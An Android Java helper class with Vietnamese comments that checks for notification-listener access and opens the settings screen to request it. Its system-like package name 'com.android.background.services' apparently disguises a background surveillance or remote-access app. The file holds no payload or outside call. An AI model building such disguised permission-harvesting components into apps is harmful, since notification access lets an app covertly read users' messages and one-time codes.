package com.android.background.services.helpers;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.android.background.services.MainService;

public class NotificationPermissionHelper {

    private static final String TAG = "NotificationPermission";

    /**
     * Kiểm tra xem ứng dụng có quyền truy cập notifications không
     */
    public static boolean isNotificationServiceEnabled() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    String enabledNotificationListeners = Settings.Secure.getString(
                        context.getContentResolver(),
                        "enabled_notification_listeners"
                    );
                    
                    if (enabledNotificationListeners != null) {
                        String packageName = context.getPackageName();
                        boolean hasPermission = enabledNotificationListeners.contains(packageName);
                        Log.d(TAG, "Notification service permission: " + (hasPermission ? "GRANTED" : "DENIED"));
                        Log.d(TAG, "Enabled listeners: " + enabledNotificationListeners);
                        Log.d(TAG, "Our package: " + packageName);
                        return hasPermission;
                    } else {
                        Log.w(TAG, "enabled_notification_listeners is null");
                    }
                } else {
                    Log.w(TAG, "Context is null");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification service permission: " + e.getMessage());
            e.printStackTrace();
        }
        return false;
    }

    /**
     * Mở settings để người dùng cấp quyền notification access
     */
    public static void requestNotificationPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                MainService.getContextOfApplication().startActivity(intent);
                
                Log.d(TAG, "Opening notification listener settings");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error opening notification settings: " + e.getMessage());
        }
    }

    /**
     * Kiểm tra và yêu cầu quyền nếu cần thiết
     */
    public static boolean checkAndRequestPermission() {
        if (!isNotificationServiceEnabled()) {
            Log.w(TAG, "Notification service permission not granted, requesting...");
            requestNotificationPermission();
            return false;
        }
        return true;
    }

    /**
     * Lấy trạng thái quyền notifications
     */
    public static String getPermissionStatus() {
        if (isNotificationServiceEnabled()) {
            return "GRANTED";
        } else {
            return "DENIED";
        }
    }
}
